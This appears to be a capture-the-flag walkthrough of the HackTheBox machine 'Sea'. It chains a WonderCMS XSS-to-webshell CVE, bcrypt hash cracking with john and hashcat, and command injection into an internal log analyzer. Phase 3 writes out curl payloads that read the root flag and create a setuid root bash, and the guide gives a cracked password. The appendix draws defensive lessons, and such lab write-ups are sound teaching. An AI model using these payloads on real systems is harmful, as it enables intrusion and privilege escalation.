Phase 1

Initial Access — WonderCMS XSS to RCE (CVE-2023-41425)

How CVE-2023-41425 works WonderCMS has a reflected XSS vulnerability in its login page. By crafting a URL with injected JavaScript, we can make the admin's browser execute arbitrary JS when they click our link. Our malicious JS calls WonderCMS's installModule API endpoint, which downloads and installs a ZIP file from our server — containing a PHP webshell. The XSS acts as a bridge between social engineering (getting admin to click a link) and code execution (installing a webshell).

Phase 2

Lateral Movement — www-data → amay

WonderCMS Database Hash

WonderCMS stores its entire configuration (including the admin password hash) in a flat JSON file:

www-data@sea:~$ cat /var/www/sea/data/database.js
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "login": "loginURL",
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q",
        ...
    }
}
Hash format cleanup The JSON file escapes forward slashes as \/. When copying the hash for cracking, make sure to unescape them back to /. The hash type is bcrypt ($2y$), hashcat mode 3200 or john auto-detect.

Crack the Hash

# Write the cleaned hash (unescape \/ to /)
$ echo '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' > hash.txt

# Crack with john
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
mychemicalromance

# Or with hashcat
$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

Phase 3

Privilege Escalation — Internal Log Analyzer Command Injection

Internal Service Discovery

amay@sea:~$ ss -tlnp
LISTEN  127.0.0.1:8080  0.0.0.0:*

Port 8080 runs a "System Monitor" web application with HTTP Basic Auth. Forward it via SSH:

$ ssh -L 9090:localhost:8080 amay@sea.htb
# Access http://localhost:9090 in browser
# Login with amay:mychemicalromance

The System Monitor has a "Log Analyzer" feature that accepts a log_file path and an analyze_log action. The analyze_log parameter is passed to a shell command without sanitization.

Command Injection via Burp Repeater

Intercept the log analysis request in Burp Suite and inject a command after analyze_log:

# Original request body:
log_file=/var/log/apache2/access.log&analyze_log=

# Injected request body — semicolon separates the original command from ours:
log_file=/var/log/apache2/access.log&analyze_log=;cat /root/root.txt

Full curl command equivalent:

$ curl -s http://localhost:9090/ \
    -u "amay:mychemicalromance" \
    -d 'log_file=/var/log/apache2/access.log&analyze_log=;cat /root/root.txt' \
    -X POST
6bcc2a3a3c7dc0bb9ad5ded7b8c2e41e

For a full root shell instead of just reading the flag:

# Create SUID bash
$ curl -s http://localhost:9090/ \
    -u "amay:mychemicalromance" \
    -d 'log_file=/var/log/apache2/access.log&analyze_log=;cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash' \
    -X POST

amay@sea:~$ /tmp/rootbash -p
rootbash-5.0# whoami
root
Appendix

Key Takeaways

XSS can chain into full RCE.

The XSS in WonderCMS's login page was "just" reflected XSS — but combined with the installModule API, it became a webshell installer. XSS severity depends entirely on what authenticated actions the application exposes.

Contact forms are XSS delivery mechanisms.

Any feature that makes an admin or bot visit a user-supplied URL can deliver XSS payloads. The "Website" field in the contact form was the delivery vector here.

Flat-file CMS databases are easy targets.

WonderCMS stores everything in database.js — no MySQL needed, but also no access controls. Any file read vulnerability exposes the admin hash.

Internal web apps often skip input validation.

The log analyzer on port 8080 was "internal only" — developers assumed it was safe because it wasn't exposed externally. But any user with SSH access (or any foothold on the box) can reach localhost services.

analyze_log parameter = shell injection.

The semicolon (;) breaks out of the intended command. Always test ;, |, $(), and backticks when you suspect shell command execution behind a web parameter.
